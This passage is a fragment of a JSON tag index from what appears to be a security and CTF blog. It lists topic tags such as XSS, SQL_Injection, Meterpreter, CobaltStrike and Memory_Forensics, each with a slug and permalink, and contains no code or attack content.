"CBC","permalink":"https://yoloyolo.top/tags/CBC/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://yoloyolo.top/tags/Vulnhub/"},{"name":"Unbengable","slug":"Unbengable","permalink":"https://yoloyolo.top/tags/Unbengable/"},{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"},{"name":"Malware","slug":"Malware","permalink":"https://yoloyolo.top/tags/Malware/"},{"name":"MT19937","slug":"MT19937","permalink":"https://yoloyolo.top/tags/MT19937/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://yoloyolo.top/tags/HTTPS/"},{"name":"Traffic_Analysis","slug":"Traffic-Analysis","permalink":"https://yoloyolo.top/tags/Traffic-Analysis/"},{"name":"Web","slug":"Web","permalink":"https://yoloyolo.top/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"},{"name":"POP","slug":"POP","permalink":"https://yoloyolo.top/tags/POP/"},{"name":"Unserialize","slug":"Unserialize","permalink":"https://yoloyolo.top/tags/Unserialize/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"},{"name":"Cyber_Attribution","slug":"Cyber-Attribution","permalink":"https://yoloyolo.top/tags/Cyber-Attribution/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://yoloyolo.top/tags/LeetCode/"},{"name":"Post_Pentest","slug":"Post-Pentest","permalink":"https://yoloyolo.top/tags/Post-Pentest/"},{"name":"Anti_AntiVirus","slug":"Anti-AntiVirus","permalink":"https://yoloyolo.top/tags/Anti-AntiVirus/"},{"name":"Meterpreter","slug":"Meterpreter","permalink":"https://yoloyolo.top/tags/Meterpreter/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://yoloyolo.top/tags/CobaltStrike/"},{"name":"Android","slug":"Android","permalink":"https://yoloyolo.top/tags/Android/"},{"name":"Application_Test","slug":"Application-Test","permalink":"https://yoloyolo.top/tags/Application-Test/"},{"name":"Lock_Picking","slug":"Lock-Picking","permalink":"https://yoloyolo.top/tags/Lock-Picking/"},{"name":"AWD","slug":"AWD","permalink":"https://yoloyolo.top/tags/AWD/"},{"name":"CISCN","slug":"CISCN","permalink":"https://yoloyolo.top/tags/CISCN/"},{"name":"PEB","slug":"PEB","permalink":"https://yoloyolo.top/tags/PEB/"},{"name":"Anti-Debug","slug":"Anti-Debug","permalink":"https://yoloyolo.top/tags/Anti-Debug/"},{"name":"LFSR","slug":"LFSR","permalink":"https://yoloyolo.top/tags/LFSR/"},{"name":"HTTP","slug":"HTTP","permalink":"https://yoloyolo.top/tags/HTTP/"},{"name":"WebShell","slug":"WebShell","permalink":"https://yoloyolo.top/tags/WebShell/"},{"name":"Mysql","slug":"Mysql","permalink":"https://yoloyolo.top/tags/Mysql/"},{"name":"Misc","slug":"Misc","permalink":"https://yoloyolo.top/tags/Misc/"},{"name":"Memory_Forensics","slug":"Memory-Forensics","permalink":"https://yoloyolo.top/tags/Memory-Forensics/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"},{"name":"BSGS","slug":"BSGS","permalink":"https://yoloyolo.top/tags/BSGS/"},{"name":"discrete_log","slug":"discrete-log","permalink":"https://yoloyolo.top/tags/discrete-log/"},{"name":"Coppersmith","slug":"Coppersmith","permalink":"https://yoloyolo.top/tags/Coppersmith/"},{"name":"XSS","slug":"XSS","permalink":"https://yoloyolo.top/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://yoloyolo.top/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://yoloyolo.top/tags/SSRF/"},{"name":"ECB","slug":"ECB","permalink":"https://yoloyolo.top/tags/ECB/"},{"name":"SQL_Injection","slug":"SQL-Injection","permalink":"https://yoloyolo.top/tags/SQL-Injection/"},{"name":"RCE","slug":"RCE","permalink":"https://yoloyolo.top/tags/RCE/"},{"name":"File_Upload","slug":"File-Upload","permalink":"https://yoloyolo.top/tags/File-Upload/"},{"name":"Reflection","slug":"Reflection","permalink":"https://yoloyolo.top/tags/Reflection/"},{"name":"FTP","slug":"FTP","permalink":"https://yoloyolo.top/tags/FTP/"},{"name":"CVE","slug":"CVE","permalink":"https://yoloyolo.top/tags/CVE/"},{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/tags/Talk/"}]}